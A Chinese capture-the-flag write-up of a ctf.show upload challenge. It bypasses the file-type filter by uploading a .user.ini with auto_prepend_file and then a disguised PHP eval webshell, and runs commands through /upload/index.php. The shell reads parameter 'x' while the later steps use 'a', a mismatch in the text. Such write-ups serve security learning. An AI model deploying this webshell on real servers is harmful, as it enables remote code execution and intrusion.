## 题目：
![[Pasted image 20240714093210.png]]

## 解答：

直接上传php文件显示文件类型不合规，尝试修改content-type上传不成功，上传php3  
后缀服务器不能解析  
尝试访问upload文件夹，发现upload文件夹有默认索引，具有index.php文件，那么可以利用.user.ini文件来进行上传

### （1）上传png文件 ，抓包修改为 .user.ini

抓包，先上传一个假图片，再修改包内容信息（配置文件）

```
文件名称：.user.ini
auto_prepend_file = 1.png
```
![[Pasted image 20240714093400.png]]

### （2）上传 1.png（一句话木马）

再次抓包，先上传一个假图片，再修改包内容信息

```
文件名：1.png
<?php
@eval($_POST['x']);
phpinfo();
?>
```

![[Pasted image 20240714093553.png]]

### （3）访问 /upload/index.php

![[Pasted image 20240714093647.png]]

### （4）由于 /upload/ 目录下所有文件自动包含 1.png

方法一：采取蚁剑连接  /upload/index.php
```
地址：http://cfb65ce0-4cc8-4a0c-a029-67ec2ea9d898.challenge.ctf.show/upload/index.php
密码：a
```

方法二：以 post 方式传递数据 a=system('ls')

